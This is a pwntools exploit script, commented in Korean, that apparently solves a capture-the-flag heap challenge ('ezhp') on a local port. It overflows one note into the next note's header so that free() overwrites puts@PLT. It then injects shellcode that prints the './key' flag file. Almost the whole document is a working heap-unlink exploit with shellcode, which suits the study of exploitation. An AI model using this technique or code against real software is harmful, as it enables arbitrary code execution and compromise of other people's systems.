#!/usr/bin/env python

from pwn import *
import os
import sys
context('i386', 'linux')

# waiting time in micro-second
WTIME = 0.1

# linked list의 *next를 가리키는 포인터 주소 4바이트 + nop2바이트 를 점프하기 위한 코드
sc = asm('jmp 0x6') 
# 정렬을 위한 nop sled 6바이트 
# heap 정렬 전 -> [eb 06 90 90 90 90 90 90] + [shellcode.cat()]
# heap 정렬 후 -> [eb 06 90 90 de ad be ef] + [shellcode.cat()]
#                              ~~~~~~~~~~~ <-- linked list의 next pointer로 변경됨
sc += asm(shellcode.nops(6))
sc += asm(shellcode.cat('./key', 1))

# 각 note는 128 바이트로 여유있게 할당
ALLOCLEN = 128
# 할당된 note 128바이트를 초과하여 overflow시키기 위한 padding 크기
# note #0의 malloc()된 위치 = 0x804c00c
# note #1의 malloc()된 위치 = 0x804c09c
# 차이는 144이며, note #0의 첫 헤더 (size + next + prev = 12 바이트)를 제외하면
# 각 노트별 거리는 132가 됨. 
PAD = 132

s = remote('localhost', 9174)
sleep(WTIME)

log.info('Inserts notes 3 times')
for i in range(0, 3):
    s.recvuntil('Please choose an option.\n')
    sleep(WTIME)
    s.send('1\n')
    s.recvuntil('Please give me a size.\n')
    sleep(WTIME)
    s.send(str(ALLOCLEN) + '\n')

log.info('done with insert notes. Next, changes note\'s size and inserts content')

s.recvuntil('Please choose an option.\n')
s.send("3\n")
sleep(WTIME)
# id 1 is second note.
s.recvuntil('Please give me an id.\n')
s.send("1\n")
sleep(WTIME)
s.recvuntil('Please give me a size.\n')
s.send(str(PAD + 4 + 4 ) + "\n")
sleep(WTIME)
s.recvuntil('Please input your data.\n')
# $ readelf --relocs ezhp | grep puts
# 0804a008  00000307 R_386_JUMP_SLOT   00000000   puts
# 0x0804a008 - 0x8 = 0x0804a008
# 0x804874a:	mov    DWORD PTR [eax+0x8],edx
# free(note id 2)가 실행되면, 여기 주소가 쉘코드가 저장된 note id 1의 주소를 가리킨다. 
# [PAD(132)][SSSS(size)][NEXT(put@PLT)][PREV(note #1의 header주소)]
s.send("B"*PAD + "SSSS" + "\x00\xa0\x04\x08" + "\n")
sleep(WTIME)

log.info('done with change notes. Next, inserts shellcode into note number 0')

s.recvuntil('Please choose an option.\n')
s.send("3\n")
sleep(WTIME)
s.recvuntil('Please give me an id.\n')
s.send("0\n")
sleep(WTIME)
s.recvuntil('Please give me a size.\n')
# note #0의 크기를 note #1의 헤더를 넘어서까지 증가 시킨 후
# note #1의 주소 0x804c09c 부터 쉘코드가 저장되도록 한다.
s.send(str(PAD+len(sc)) + "\n")
sleep(WTIME)
s.recvuntil('Please input your data.\n')
s.send("A"*PAD + sc + "\n")
sleep(WTIME)

log.info('done with insert shellcode into target note. Bang!')

# 수정된 헤더를 가진 note #2를 제거하면, 
# free() 시스템에 의해서 puts@PLT의 주소에 shellcode가 저장된 0x804c09가
# 덮어써지게 되며,
# menu를 출력하기 위해 puts() 함수가 호출됨과 동시에 쉘코드가 실행됨.
# note2->prev = next ==> note1->next = (puts@PLT-8)
# note2->next = prev ==> next2->next(puts@PLT-8)+8 = prev(note1's header's address)
# 그리고 진짜 free()에서 위의 노드가 정리되면서 각자의 주소가 치환된다. 
s.recvuntil('Please choose an option.\n')
s.send("2\n")
s.recvuntil('Please give me an id.\n')
s.send("2\n")

rv = s.recv(1024)
if len(rv) != 0:
    log.warning('Flag: %s' % (rv))
else:
    log.error('There is no result from there!')
s.close()